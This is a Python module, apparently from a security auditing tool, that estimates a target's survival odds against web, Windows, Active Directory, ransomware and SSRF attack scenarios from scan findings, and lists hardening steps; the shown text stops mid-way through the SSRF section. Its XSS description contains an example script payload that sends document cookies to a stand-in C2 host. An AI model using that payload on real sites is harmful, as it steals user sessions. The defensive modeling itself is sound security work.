"""
CHARLO Testing Agent - Theoretical Attack Resilience & Survival Simulator.
Evaluates defensive posture against real-world theoretical attack vectors:
Web: SQLi, DDoS, BOLA/IDOR, XSS, SSRF, Credential Stuffing
Windows: Buffer Overflow, DLL Side-Loading/Injection, Active Directory Identity Attacks (PtH/Kerberoasting)
Cross-Platform / Infrastructure: Ransomware & RCE, SSRF, Password Spraying
Mobile (APK): Intent Hijacking, JDWP Debugger Injection, Storage Theft

Calculates mathematical Survival Probability (%) based on observed defensive controls
and detected security gaps. Purely defensive threat modeling — no offensive payloads or attacks.
"""

from dataclasses import dataclass, field, asdict
from typing import List, Dict, Any, Optional
from ..core.models import ScanResult, TargetType, CheckStatus, CheckFinding


@dataclass
class ContributingVulnerability:
    check_id: str
    title: str
    impact_penalty: float  # e.g. -25%
    description: str

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class AttackScenarioResult:
    attack_id: str
    name: str
    category: str
    threat_objective: str
    vector_description: str
    survival_chance: float  # 5.0% to 98.0%
    verdict: str  # "Hardened", "Strong", "Moderate", "Low", "Critical Exposure"
    verdict_badge_color: str
    contributing_vulnerabilities: List[ContributingVulnerability] = field(default_factory=list)
    mitigating_controls_active: List[str] = field(default_factory=list)
    mitigating_controls_missing: List[str] = field(default_factory=list)
    hardening_steps: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        d = asdict(self)
        d["contributing_vulnerabilities"] = [v.to_dict() for v in self.contributing_vulnerabilities]
        return d


@dataclass
class AttackSimulationReport:
    target_name: str
    target_type: str
    overall_survival_chance: float
    overall_verdict: str
    overall_badge_color: str
    summary_narrative: str
    total_attacks_tested: int
    hardened_count: int
    moderate_count: int
    critical_exposure_count: int
    attacks: List[AttackScenarioResult] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "target_name": self.target_name,
            "target_type": self.target_type,
            "overall_survival_chance": self.overall_survival_chance,
            "overall_verdict": self.overall_verdict,
            "overall_badge_color": self.overall_badge_color,
            "summary_narrative": self.summary_narrative,
            "total_attacks_tested": self.total_attacks_tested,
            "hardened_count": self.hardened_count,
            "moderate_count": self.moderate_count,
            "critical_exposure_count": self.critical_exposure_count,
            "attacks": [a.to_dict() for a in self.attacks],
        }


class AttackResilienceSimulator:
    """
    Simulates theoretical attack scenarios against audited targets to determine
    the statistical chance of surviving each cyberattack vector.
    """

    @classmethod
    def simulate(cls, scan_result: ScanResult) -> AttackSimulationReport:
        target = scan_result.target
        target_name = target.display_name if target else "Unknown Target"
        target_type = target.target_type if target else TargetType.WEB
        findings = scan_result.findings
        context = target.metadata if target else {}

        return cls.simulate_target(
            target_name=target_name,
            target_type=target_type,
            findings=findings,
            context=context,
            duration=scan_result.duration_seconds,
        )

    @classmethod
    def simulate_target(
        cls,
        target_name: str,
        target_type: TargetType,
        findings: List[CheckFinding],
        context: Optional[Dict[str, Any]] = None,
        duration: float = 0.0,
    ) -> AttackSimulationReport:
        context = context or {}
        # Map findings by check_id for rapid inspection
        failed_or_warn = {
            f.check_id: f for f in findings if f.status in (CheckStatus.FAILED, CheckStatus.WARNING)
        }
        passed_ids = {
            f.check_id: f for f in findings if f.status == CheckStatus.PASSED
        }

        attacks: List[AttackScenarioResult] = []

        if target_type == TargetType.WEB:
            attacks.extend(cls._evaluate_web_attacks(failed_or_warn, passed_ids, context))
            attacks.extend(cls._evaluate_infra_attacks(failed_or_warn, passed_ids, context))
        elif target_type == TargetType.EXE:
            attacks.extend(cls._evaluate_exe_attacks(failed_or_warn, passed_ids, context))
            attacks.extend(cls._evaluate_windows_identity_attacks(failed_or_warn, passed_ids, context))
            attacks.extend(cls._evaluate_infra_attacks(failed_or_warn, passed_ids, context))
        elif target_type == TargetType.APK:
            attacks.extend(cls._evaluate_apk_attacks(failed_or_warn, passed_ids, context))
            attacks.extend(cls._evaluate_infra_attacks(failed_or_warn, passed_ids, context))

        if not attacks:
            # Fallback general attack evaluation
            attacks.extend(cls._evaluate_infra_attacks(failed_or_warn, passed_ids, context))

        # Calculate Overall Resilience Score
        total_attacks = len(attacks)
        avg_survival = round(sum(a.survival_chance for a in attacks) / max(1, total_attacks), 1)

        hardened = sum(1 for a in attacks if a.survival_chance >= 75.0)
        moderate = sum(1 for a in attacks if 45.0 <= a.survival_chance < 75.0)
        critical = sum(1 for a in attacks if a.survival_chance < 45.0)

        if avg_survival >= 80.0:
            overall_verdict = "Hardened Defense-in-Depth (High Survival)"
            overall_color = "#00FF66"
        elif avg_survival >= 60.0:
            overall_verdict = "Moderate Resilience (Conditional Defense)"
            overall_color = "#FFB800"
        elif avg_survival >= 40.0:
            overall_verdict = "Significant Exposure (Low Survival Likelihood)"
            overall_color = "#FF6B22"
        else:
            overall_verdict = "Critical Vulnerability (Imminent Compromise Risk)"
            overall_color = "#FF3366"

        narrative = (
            f"CHARLO Threat Resilience Simulator audited '{target_name}' across {total_attacks} theoretical attack vectors. "
            f"The target achieved an aggregate Attack Survival Index of {avg_survival}%. "
            f"The laboratory observed {hardened} resilient/hardened vectors, {moderate} conditionally protected vectors, "
            f"and {critical} vectors presenting critical exposure. Defense-in-depth controls directly dictate resilience."
        )

        return AttackSimulationReport(
            target_name=target_name,
            target_type=target_type.value.upper(),
            overall_survival_chance=avg_survival,
            overall_verdict=overall_verdict,
            overall_badge_color=overall_color,
            summary_narrative=narrative,
            total_attacks_tested=total_attacks,
            hardened_count=hardened,
            moderate_count=moderate,
            critical_exposure_count=critical,
            attacks=attacks,
        )

    # =========================================================================
    # 1. WEB ATTACK SIMULATIONS
    # =========================================================================

    @classmethod
    def _evaluate_web_attacks(
        cls,
        failed: Dict[str, CheckFinding],
        passed: Dict[str, CheckFinding],
        ctx: Dict[str, Any],
    ) -> List[AttackScenarioResult]:
        results: List[AttackScenarioResult] = []

        # ---------------------------------------------------------------------
        # 1. SQL Injection (SQLi)
        # ---------------------------------------------------------------------
        sqli_vulns: List[ContributingVulnerability] = []
        sqli_active: List[str] = []
        sqli_missing: List[str] = []
        sqli_score = 75.0  # baseline assuming standard modern framework

        if "BUG-WEB-003" in failed:
            sqli_vulns.append(ContributingVulnerability(
                check_id="BUG-WEB-003",
                title="Database / Runtime Stack Trace Leaks",
                impact_penalty=-30.0,
                description="Unhandled backend exception pages disclose database dialect, table names, and query fragments, accelerating automated SQLi payload tuning."
            ))
            sqli_score -= 30.0
        else:
            sqli_active.append("Zero server-side database stack trace or debug pages leaking")

        if "BUG-WEB-002" in failed:
            sqli_vulns.append(ContributingVulnerability(
                check_id="BUG-WEB-002",
                title="Unconstrained / Unvalidated Form Inputs",
                impact_penalty=-20.0,
                description="HTML form fields lack client/server boundary validation constraints, permitting arbitrary SQL metacharacter injection."
            ))
            sqli_score -= 20.0
        else:
            sqli_active.append("Form inputs enforce semantic validation patterns")

        if "WEB-018" in failed:
            sqli_vulns.append(ContributingVulnerability(
                check_id="WEB-018",
                title="Exposed .env Database Credentials",
                impact_penalty=-35.0,
                description="Publicly exposed environment config leaks database host, user, and password, rendering web-layer injection redundant."
            ))
            sqli_score -= 35.0

        if "WEB-008" in failed:
            sqli_missing.append("Web server/framework version banners exposed (fingerprintable backend)")
            sqli_score -= 5.0
        else:
            sqli_active.append("Web server technology banners masked")

        if "WEB-001" in passed:
            sqli_active.append("Transport encrypted via HTTPS preventing in-transit payload sniffing")
            sqli_score += 5.0

        sqli_score = max(5.0, min(96.0, sqli_score))
        results.append(cls._build_scenario(
            attack_id="ATK-WEB-SQLI",
            name="SQL Injection (SQLi) Attack",
            category="Web Application Attacks",
            threat_objective="Extract backend database tables, dump customer/admin credentials, bypass authentication, or write malicious web shells.",
            vector_description=(
                "Adversary submits crafted SQL syntax metacharacters (quotes, dashes, UNION SELECT, boolean logic) into HTTP GET/POST parameters. "
                "If queries are constructed via string concatenation rather than parameterized bindings, the database engine executes adversary commands."
            ),
            survival_chance=sqli_score,
            contributing_vulnerabilities=sqli_vulns,
            mitigating_controls_active=sqli_active,
            mitigating_controls_missing=sqli_missing or ["Strict ORM / Parameterized query validation on internal APIs"],
            hardening_steps=[
                "Enforce PreparedStatements and Parameterized Queries exclusively across all database adapters.",
                "Disable all detailed database error reporting (`display_errors = Off`) in production.",
                "Deploy a Web Application Firewall (WAF) rule group targeting SQL syntax injection signatures.",
                "Apply the Principle of Least Privilege: ensure application database user lacks DROP, ALTER, and administrative privileges.",
            ]
        ))

        # ---------------------------------------------------------------------
        # 2. Distributed Denial of Service (DDoS)
        # ---------------------------------------------------------------------
        ddos_vulns: List[ContributingVulnerability] = []
        ddos_active: List[str] = []
        ddos_missing: List[str] = []
        ddos_score = 65.0

        if "WEB-028" in failed:
            ddos_vulns.append(ContributingVulnerability(
                check_id="WEB-028",
                title="Missing HTTP Request Rate Limiting (429)",
                impact_penalty=-30.0,
                description="Web application does not enforce HTTP 429 Too Many Requests response throttling, allowing automated volumetric bot floods."
            ))
            ddos_score -= 30.0
            ddos_missing.append("Edge or gateway-level HTTP rate limiting (429 Too Many Requests)")
        else:
            ddos_active.append("Automated HTTP rate limiting / request throttling active")
            ddos_score += 15.0

        # Check for CDN / Edge headers
        server_hdr = str(ctx.get("headers", {}).get("server", "")).lower()
        cf_ray = "cf-ray" in ctx.get("headers", {})
        if cf_ray or "cloudflare" in server_hdr or "akamai" in server_hdr or "cloudfront" in server_hdr:
            ddos_active.append("Cloud Edge CDN / Anycast DDoS mitigation reverse proxy active (Cloudflare/Akamai/AWS)")
            ddos_score += 25.0
        else:
            ddos_missing.append("Anycast CDN / Global Edge DDoS shielding not detected on root host")
            ddos_score -= 10.0

        if "BUG-WEB-001" in failed:
            ddos_score -= 5.0
            ddos_vulns.append(ContributingVulnerability(
                check_id="BUG-WEB-001",
                title="High Dynamic Overhead / Dead Navigation Elements",
                impact_penalty=-5.0,
                description="Uncached placeholder endpoints cause unnecessary backend server thread spin."
            ))

        ddos_score = max(5.0, min(95.0, ddos_score))
        results.append(cls._build_scenario(
            attack_id="ATK-WEB-DDOS",
            name="Distributed Denial of Service (DDoS) Attack",
            category="Web Application Attacks",
            threat_objective="Exhaust web server sockets, CPU, and upstream network bandwidth to render portal completely unreachable.",
            vector_description=(
                "Adversary orchestrates botnet-driven Layer 4 UDP/SYN volumetric floods alongside Layer 7 HTTP GET/POST storm requests (e.g. Slowloris, "
                "HTTP/2 Rapid Reset), exhausting worker process threads and saturating connection backlogs."
            ),
            survival_chance=ddos_score,
            contributing_vulnerabilities=ddos_vulns,
            mitigating_controls_active=ddos_active,
            mitigating_controls_missing=ddos_missing,
            hardening_steps=[
                "Route domain traffic through an Anycast Edge Cloud (Cloudflare, AWS CloudFront, Fastly) to absorb volumetric L3/L4 surges.",
                "Configure strict application-layer rate limits on expensive API endpoints (e.g. max 60 requests/minute per IP).",
                "Enforce aggressive connection timeouts (`keepalive_timeout 5s; client_header_timeout 5s;`) to mitigate Slowloris resource holding.",
                "Implement origin IP cloaking: drop all direct traffic to server origin IP that does not originate from CDN proxy CIDRs.",
            ]
        ))

        # ---------------------------------------------------------------------
        # 3. Broken Object Level Authorization (BOLA / IDOR)
        # ---------------------------------------------------------------------
        bola_vulns: List[ContributingVulnerability] = []
        bola_active: List[str] = []
        bola_missing: List[str] = []
        bola_score = 70.0

        if "WEB-023" in failed:
            bola_vulns.append(ContributingVulnerability(
                check_id="WEB-023",
                title="Exposed Swagger / OpenAPI Documentation",
                impact_penalty=-25.0,
                description="Publicly indexed API schemas expose object model hierarchies and internal resource identifier formats to unauthenticated crawlers."
            ))
            bola_score -= 25.0
            bola_missing.append("Swagger/OpenAPI schema restricted to authenticated developer roles")
        else:
            bola_active.append("API route schemas and OpenAPI documentation unexposed to public crawlers")

        if "BUG-WEB-002" in failed:
            bola_vulns.append(ContributingVulnerability(
                check_id="BUG-WEB-002",
                title="Unprotected Form State / Sequential Identifiers",
                impact_penalty=-15.0,
                description="Form inputs permit manipulation of hidden numeric record IDs without server-side ownership cross-checks."
            ))
            bola_score -= 15.0

        if "WEB-007" in failed:
            bola_vulns.append(ContributingVulnerability(
                check_id="WEB-007",
                title="Insecure Session Cookie Configuration",
                impact_penalty=-15.0,
                description="Session identifiers lacking proper SameSite/HttpOnly attributes permit token interception and multi-account state confusion."
            ))
            bola_score -= 15.0
            bola_missing.append("Strict session token isolation and SameSite=Strict cookies")
        else:
            bola_active.append("Session cookies protected with Secure and HttpOnly flags")
            bola_score += 10.0

        bola_score = max(5.0, min(95.0, bola_score))
        results.append(cls._build_scenario(
            attack_id="ATK-WEB-BOLA",
            name="Broken Object Level Authorization (BOLA / IDOR) Attack",
            category="Web Application Attacks",
            threat_objective="Access, modify, or delete sensitive data records belonging to other tenants or administrative users by tampering with resource IDs.",
            vector_description=(
                "Adversary inspects authorized requests (e.g. `/api/v1/records/1082`) and replaces the identifier with another user's ID (`/api/v1/records/1083`). "
                "If the backend fails to validate that the requesting user's session owns the target object, unauthorized cross-tenant data is leaked."
            ),
            survival_chance=bola_score,
            contributing_vulnerabilities=bola_vulns,
            mitigating_controls_active=bola_active,
            mitigating_controls_missing=bola_missing or ["Contextual ABAC / RBAC middleware verifying object-level tenancy"],
            hardening_steps=[
                "Implement an explicit Authorization Filter on every database retrieval (e.g. `WHERE id = :id AND tenant_id = :session_tenant_id`).",
                "Replace guessable sequential integer auto-increment IDs (`id=1, 2, 3`) with cryptographically random UUIDv4 identifiers.",
                "Restrict public access to Swagger, Postman, and OpenAPI schemas in production deployments.",
                "Conduct automated regression tests specifically attempting cross-user object access using separate JWT tokens.",
            ]
        ))

        # ---------------------------------------------------------------------
        # 4. Cross-Site Scripting (XSS)
        # ---------------------------------------------------------------------
        xss_vulns: List[ContributingVulnerability] = []
        xss_active: List[str] = []
        xss_missing: List[str] = []
        xss_score = 60.0

        if "WEB-003" in failed:
            xss_vulns.append(ContributingVulnerability(
                check_id="WEB-003",
                title="Missing / Permissive Content-Security-Policy (CSP)",
                impact_penalty=-35.0,
                description="Absence of Content-Security-Policy header permits browsers to execute arbitrary injected inline scripts, eval(), and external rogue JS."
            ))
            xss_score -= 35.0
            xss_missing.append("Strict Content-Security-Policy (CSP) enforcing nonce-based script-src")
        else:
            xss_active.append("Content-Security-Policy (CSP) active and enforcing script execution boundaries")
            xss_score += 25.0

        if "WEB-007" in failed:
            xss_vulns.append(ContributingVulnerability(
                check_id="WEB-007",
                title="Missing HttpOnly Flag on Cookies",
                impact_penalty=-25.0,
                description="Authentication session cookies are readable by `document.cookie`, allowing injected XSS payloads to immediately exfiltrate tokens."
            ))
            xss_score -= 25.0
            xss_missing.append("HttpOnly flag on all authentication and session cookies")
        else:
            xss_active.append("HttpOnly flag prevents JavaScript from accessing session tokens")
            xss_score += 15.0

        if "WEB-005" in failed:
            xss_vulns.append(ContributingVulnerability(
                check_id="WEB-005",
                title="Missing X-Content-Type-Options: nosniff",
                impact_penalty=-10.0,
                description="Permits browser MIME-sniffing, allowing user-uploaded media to be interpreted as executable HTML/JavaScript."
            ))
            xss_score -= 10.0
            xss_missing.append("X-Content-Type-Options: nosniff header")
        else:
            xss_active.append("X-Content-Type-Options: nosniff prevents MIME-type confusion attacks")
            xss_score += 5.0

        xss_score = max(5.0, min(97.0, xss_score))
        results.append(cls._build_scenario(
            attack_id="ATK-WEB-XSS",
            name="Cross-Site Scripting (XSS) Attack (Stored / Reflected / DOM)",
            category="Web Application Attacks",
            threat_objective="Execute unauthorized JavaScript in victims' browsers to hijack session tokens, log keystrokes, and trigger unauthorized administrative actions.",
            vector_description=(
                "Adversary injects HTML/JavaScript fragments (`<script>fetch('https://c2.io/?c='+document.cookie)</script>`) into input fields or URL parameters. "
                "When rendered unescaped by the victim's browser, the browser executes the malicious payload within the trusted origin context."
            ),
            survival_chance=xss_score,
            contributing_vulnerabilities=xss_vulns,
            mitigating_controls_active=xss_active,
            mitigating_controls_missing=xss_missing,
            hardening_steps=[
                "Deploy a strict Content-Security-Policy (CSP): `script-src 'self' 'nonce-xyz' https:; object-src 'none'; base-uri 'self';`.",
                "Ensure every authentication and session cookie sets the `HttpOnly` flag so JavaScript cannot read session tokens.",
                "Enforce contextual HTML/attribute entity encoding on all dynamic variables rendered inside HTML templates.",
                "Add `X-Content-Type-Options: nosniff` to prevent browser MIME-sniffing on static downloads.",
            ]
        ))

        return results

    # =========================================================================
    # 2. WINDOWS APPLICATION & OS ATTACKS
    # =========================================================================

    @classmethod
    def _evaluate_exe_attacks(
        cls,
        failed: Dict[str, CheckFinding],
        passed: Dict[str, CheckFinding],
        ctx: Dict[str, Any],
    ) -> List[AttackScenarioResult]:
        results: List[AttackScenarioResult] = []

        # ---------------------------------------------------------------------
        # 1. Buffer Overflow Attack (Stack/Heap Smash & ROP)
        # ---------------------------------------------------------------------
        bof_vulns: List[ContributingVulnerability] = []
        bof_active: List[str] = []
        bof_missing: List[str] = []
        bof_score = 70.0

        if "EXE-001" in failed:
            bof_vulns.append(ContributingVulnerability(
                check_id="EXE-001",
                title="Missing ASLR (/DYNAMICBASE)",
                impact_penalty=-35.0,
                description="Static memory base address allows attackers to construct deterministic Return-Oriented Programming (ROP) exploit chains."
            ))
            bof_score -= 35.0
            bof_missing.append("Address Space Layout Randomization (ASLR /DYNAMICBASE)")
        else:
            bof_active.append("ASLR (/DYNAMICBASE) randomizes module base address at launch")
            bof_score += 15.0

        if "EXE-002" in failed:
            bof_vulns.append(ContributingVulnerability(
                check_id="EXE-002",
                title="Missing DEP/NX (/NXCOMPAT)",
                impact_penalty=-35.0,
                description="Stack and heap memory pages are marked executable, allowing direct shellcode execution without requiring ROP bypasses."
            ))
            bof_score -= 35.0
            bof_missing.append("Data Execution Prevention (DEP /NXCOMPAT)")
        else:
            bof_active.append("Data Execution Prevention (DEP /NXCOMPAT) blocks code execution on data pages")
            bof_score += 15.0

        if "EXE-014" in failed or "BUG-EXE-004" in failed:
            bof_vulns.append(ContributingVulnerability(
                check_id="EXE-014",
                title="Missing Security Cookie Canary (/GS)",
                impact_penalty=-20.0,
                description="Stack frames lack random canary values, allowing contiguous buffer overflows to overwrite return pointers undetected."
            ))
            bof_score -= 20.0
            bof_missing.append("Stack Canary Cookie compiler mitigation (/GS)")
        else:
            bof_active.append("Stack cookie guards (/GS) detect contiguous stack smashing")

        if "EXE-004" in failed:
            bof_vulns.append(ContributingVulnerability(
                check_id="EXE-004",
                title="Writable & Executable (W+X) Section Flagged",
                impact_penalty=-30.0,
                description="PE section possesses both WRITE and EXECUTE flags simultaneously, providing trivial memory real-estate for raw shellcode."
            ))
            bof_score -= 30.0
            bof_missing.append("Strict W^X (Write XOR Execute) memory page segregation")

        if "BUG-EXE-002" in failed or "EXE-034" in failed:
            bof_vulns.append(ContributingVulnerability(
                check_id="BUG-EXE-002",
                title="Imported Banned Legacy CRT Functions",
                impact_penalty=-20.0,
                description="Binary imports unsafe boundary-unchecked CRT routines (strcpy, sprintf, gets) prone to classic input buffer overruns."
            ))
            bof_score -= 20.0
            bof_missing.append("Migration to bounds-checked safe CRT routines (strcpy_s, sprintf_s)")
        else:
            bof_active.append("Zero banned unbounded legacy CRT functions imported")

        bof_score = max(5.0, min(97.0, bof_score))
        results.append(cls._build_scenario(
            attack_id="ATK-EXE-BOF",
            name="Buffer Overflow Attack (Stack/Heap Smash & ROP)",
            category="Windows Operating System Attacks",
            threat_objective="Overwrite saved return addresses or function pointers in process memory to hijack CPU execution flow and execute arbitrary shellcode.",
            vector_description=(
                "Adversary supplies an oversized input payload exceeding the destination buffer capacity. In the absence of /GS stack cookies and DEP, "
                "the excess bytes corrupt the instruction pointer (EIP/RIP) and divert execution to injected shellcode or ROP gadgets."
            ),
            survival_chance=bof_score,
            contributing_vulnerabilities=bof_vulns,
            mitigating_controls_active=bof_active,
            mitigating_controls_missing=bof_missing,
            hardening_steps=[
                "Compile executable with `/GS` (Buffer Security Check), `/DYNAMICBASE` (ASLR), and `/NXCOMPAT` (DEP) enabled in MSVC.",
                "Enable Control Flow Guard (`/guard:cf`) and High Entropy 64-bit ASLR (`/HIGHENTROPYVA`).",
                "Replace all legacy unbounded C runtime calls (`strcpy`, `sprintf`, `strcat`, `gets`) with safe bounds-checked equivalents (`strcpy_s`, `snprintf_s`).",
                "Ensure strict W^X enforcement: no PE section should possess IMAGE_SCN_MEM_WRITE and IMAGE_SCN_MEM_EXECUTE concurrently.",
            ]
        ))

        # ---------------------------------------------------------------------
        # 2. DLL Side-Loading & DLL Injection Attack
        # ---------------------------------------------------------------------
        dll_vulns: List[ContributingVulnerability] = []
        dll_active: List[str] = []
        dll_missing: List[str] = []
        dll_score = 65.0

        if "EXE-003" in failed:
            dll_vulns.append(ContributingVulnerability(
                check_id="EXE-003",
                title="Missing Authenticode Digital Signature",
                impact_penalty=-30.0,
                description="Binary lacks a valid Microsoft Authenticode signature; Windows cannot verify binary origin or prevent rogue DLL loading."
            ))
            dll_score -= 30.0
            dll_missing.append("Authenticode code signing certificate")
        else:
            dll_active.append("Valid Authenticode digital signature guarantees binary authenticity")
            dll_score += 20.0

        if "EXE-006" in failed:
            dll_vulns.append(ContributingVulnerability(
                check_id="EXE-006",
                title="Suspicious Process Injection APIs Imported",
                impact_penalty=-25.0,
                description="Binary imports VirtualAllocEx, WriteProcessMemory, or CreateRemoteThread, which are commonly hijacked or abused for reflective injection."
            ))
            dll_score -= 25.0
            dll_missing.append("Strict process memory isolation and absence of cross-process injection APIs")
        else:
            dll_active.append("No suspicious cross-process injection primitives in import table")
            dll_score += 10.0

        if "BUG-EXE-003" in failed:
            dll_vulns.append(ContributingVulnerability(
                check_id="BUG-EXE-003",
                title="Unquoted Executable / Service Path Hazard",
                impact_penalty=-15.0,
                description="Executable paths with spaces lack surrounding quotes, allowing attackers to plant rogue binaries earlier in the path sequence."
            ))
            dll_score -= 15.0

        dll_score = max(5.0, min(95.0, dll_score))
        results.append(cls._build_scenario(
            attack_id="ATK-EXE-DLL",
            name="DLL Side-Loading & DLL Injection Attack",
            category="Windows Operating System Attacks",
            threat_objective="Drop a malicious proxy DLL into the application directory to execute code with application privileges, bypass EDRs, or inject payloads into remote processes.",
            vector_description=(
                "Adversary exploits Windows DLL search order rules. By placing a malicious payload with the same name as an expected system DLL "
                "in the application root directory, the vulnerable application loads and executes the attacker's DLL before consulting System32."
            ),
            survival_chance=dll_score,
            contributing_vulnerabilities=dll_vulns,
            mitigating_controls_active=dll_active,
            mitigating_controls_missing=dll_missing,
            hardening_steps=[
                "Digitally sign all production binaries and accompanying DLLs using an authorized Microsoft Authenticode certificate.",
                "Call `SetDefaultDllDirectories(LOAD_LIBRARY_SEARCH_SYSTEM32 | LOAD_LIBRARY_SEARCH_APPLICATION_DIR)` in `main()` before loading libraries.",
                "Specify absolute paths when calling `LoadLibrary` or use SxS manifests (`assemblyIdentity`) to enforce strict dependency binding.",
                "Deploy the application exclusively in protected directory structures (`C:\\Program Files\\`) with restricted write ACLs.",
            ]
        ))

        return results

    # =========================================================================
    # 3. WINDOWS IDENTITY & ACTIVE DIRECTORY ATTACKS
    # =========================================================================

    @classmethod
    def _evaluate_windows_identity_attacks(
        cls,
        failed: Dict[str, CheckFinding],
        passed: Dict[str, CheckFinding],
        ctx: Dict[str, Any],
    ) -> List[AttackScenarioResult]:
        results: List[AttackScenarioResult] = []

        # ---------------------------------------------------------------------
        # Active Directory Identity Attacks (Pass-the-Hash & Kerberoasting)
        # ---------------------------------------------------------------------
        ad_vulns: List[ContributingVulnerability] = []
        ad_active: List[str] = []
        ad_missing: List[str] = []
        ad_score = 65.0

        if "EXE-010" in failed or "APK-006" in failed:
            ad_vulns.append(ContributingVulnerability(
                check_id="EXE-010",
                title="Hardcoded Credentials / Domain Service Account Secrets",
                impact_penalty=-35.0,
                description="Application contains static passwords, tokens, or Kerberos service account credentials embedded directly in binary strings."
            ))
            ad_score -= 35.0
            ad_missing.append("Hardware-backed credential storage (Windows Credential Manager / DPAPI)")
        else:
            ad_active.append("No plaintext credentials or service account tokens embedded in application binaries")
            ad_score += 15.0

        if "EXE-013" in failed:
            ad_vulns.append(ContributingVulnerability(
                check_id="EXE-013",
                title="uiAccess='true' in Embedded Manifest",
                impact_penalty=-20.0,
                description="Bypasses User Interface Privilege Isolation (UIPI), allowing lower-privileged code to inject keystrokes into elevated admin sessions."
            ))
            ad_score -= 20.0
            ad_missing.append("Enforced User Interface Privilege Isolation (uiAccess=false)")

        # Machine architecture check
        if ctx.get("machine_arch") == "AMD64 (64-bit)":
            ad_active.append("64-bit architecture supports Windows Defender Credential Guard and Kernel Virtualization")
            ad_score += 10.0

        ad_score = max(5.0, min(95.0, ad_score))
        results.append(cls._build_scenario(
            attack_id="ATK-WIN-AD-PTH",
            name="Active Directory Identity Attacks (Pass-the-Hash & Kerberoasting)",
            category="Enterprise Identity & Windows Domain Attacks",
            threat_objective="Harvest NTLM hashes or Kerberos service tickets to authenticate across corporate domain assets without cracking passwords, escalating to Domain Admin.",
            vector_description=(
                "Adversary extracts NTLM hashes or requests Kerberos TGS tickets for Service Principal Names (SPNs). "
                "In Pass-the-Hash (PtH), the NTLM hash is passed directly to SMB/RPC authentication interfaces without knowing plaintext. "
                "In Kerberoasting, weak service account hashes are extracted and cracked offline via high-speed GPU dictionaries."
            ),
            survival_chance=ad_score,
            contributing_vulnerabilities=ad_vulns,
            mitigating_controls_active=ad_active,
            mitigating_controls_missing=ad_missing or ["Windows Credential Guard (VBS) and LSA Protection (RunAsPPL) enabled on host"],
            hardening_steps=[
                "Enable Windows Defender Credential Guard (Virtualization-Based Security) to isolate LSASS credential caches in a virtual sandbox.",
                "Enable Protected Process Light for LSASS (`RunAsPPL = 1`) to block unauthorized memory reading via Mimikatz / ProcDump.",
                "Migrate enterprise service accounts to Group Managed Service Accounts (gMSA) with rotating 128-character complex passwords to neutralize Kerberoasting.",
                "Disable NTLMv1 and restrict NTLM usage across the enterprise in favor of Kerberos with AES-256 encryption.",
            ]
        ))

        return results

    # =========================================================================
    # 4. CROSS-PLATFORM & INFRASTRUCTURE THREATS
    # =========================================================================

    @classmethod
    def _evaluate_infra_attacks(
        cls,
        failed: Dict[str, CheckFinding],
        passed: Dict[str, CheckFinding],
        ctx: Dict[str, Any],
    ) -> List[AttackScenarioResult]:
        results: List[AttackScenarioResult] = []

        # ---------------------------------------------------------------------
        # 1. Ransomware & Remote Code Execution (RCE)
        # ---------------------------------------------------------------------
        rce_vulns: List[ContributingVulnerability] = []
        rce_active: List[str] = []
        rce_missing: List[str] = []
        rce_score = 65.0

        if "WEB-017" in failed:
            rce_vulns.append(ContributingVulnerability(
                check_id="WEB-017",
                title="Exposed .git Repository / Source Code",
                impact_penalty=-35.0,
                description="Adversaries reconstruct full application code, discovering 0-day RCE injection gadgets and internal cloud API tokens."
            ))
            rce_score -= 35.0
            rce_missing.append("Complete suppression of source control metadata (.git)")
        else:
            rce_active.append("Source control repository metadata (.git) protected from public access")

        if "WEB-018" in failed:
            rce_vulns.append(ContributingVulnerability(
                check_id="WEB-018",
                title="Exposed .env Configuration File",
                impact_penalty=-35.0,
                description="Discloses cloud service master keys, database credentials, and secret application signing salts, enabling direct infrastructure takeover."
            ))
            rce_score -= 35.0
            rce_missing.append("Secure cloud secret management (AWS Secrets Manager / Azure Key Vault)")

        if "BUG-WEB-003" in failed:
            rce_vulns.append(ContributingVulnerability(
                check_id="BUG-WEB-003",
                title="Leaked Debugger Pages / Unhandled Stack Traces",
                impact_penalty=-20.0,
                description="Debug consoles (Werkzeug, Laravel Ignition) frequently allow interactive code execution if not locked down."
            ))
            rce_score -= 20.0

        if "EXE-004" in failed:
            rce_vulns.append(ContributingVulnerability(
                check_id="EXE-004",
                title="Writable & Executable Memory Sections",
                impact_penalty=-25.0,
                description="Provides direct in-memory landing zones for ransomware payload staging."
            ))
            rce_score -= 25.0

        if "WEB-001" in passed:
            rce_active.append("Transport security encrypted via modern TLS")
            rce_score += 10.0

        rce_score = max(5.0, min(95.0, rce_score))
        results.append(cls._build_scenario(
            attack_id="ATK-INF-RANSOM",
            name="Ransomware & Remote Code Execution (RCE)",
            category="Infrastructure & Threat Actor Campaigns",
            threat_objective="Gain initial footholds via code execution, disable volume shadow copies, establish C2 persistence, and encrypt critical enterprise datastores.",
            vector_description=(
                "Adversary leverages remote code execution vulnerabilities (e.g. unsafe deserialization, template injection, unauthenticated API flaws) "
                "to deploy secondary payloads. Once established, the ransomware discovers accessible file shares, terminates database services, "
                "and uses hybrid encryption (ChaCha20/AES + RSA) to lock files."
            ),
            survival_chance=rce_score,
            contributing_vulnerabilities=rce_vulns,
            mitigating_controls_active=rce_active,
            mitigating_controls_missing=rce_missing or ["Immutable Air-Gapped Offsite Backups and strict host Application Whitelisting"],
            hardening_steps=[
                "Implement the 3-2-1 backup strategy with immutable, air-gapped, or WORM (Write Once, Read Many) cloud storage to guarantee disaster recovery.",
                "Enforce the Principle of Least Privilege: ensure application services run under dedicated non-root / non-administrator service accounts.",
                "Deploy Endpoint Detection & Response (EDR) with behavioral ransomware tripwires that detect mass file modification and shadow-copy deletion (`vssadmin`).",
                "Maintain strict egress firewall policies preventing hosts from communicating with unknown external Command-and-Control (C2) IP addresses.",
            ]
        ))

        # ---------------------------------------------------------------------
        # 2. Server-Side Request Forgery (SSRF)
        # ---------------------------------------------------------------------
        ssrf_vulns: List[ContributingVulnerability] = []
        ssrf_active: List[str] = []
        ssrf_missing: List[str] = []
        ssrf_score = 70.0

        if "WEB-016" in failed:
            ssrf_vulns.append(ContributingVulnerability(
                check_id="WEB-016",
                title="Open Redirection Vulnerability Indicator",
                impact_penalty=-25.0,
                description="Application accepts unvalidated target URLs in query parameters, which can be chained to bypass SSRF filter whitelists."
            ))
            ssrf_score -= 25.0
            ssrf_missing.append("Strict destination domain whitelist for HTTP redirects")
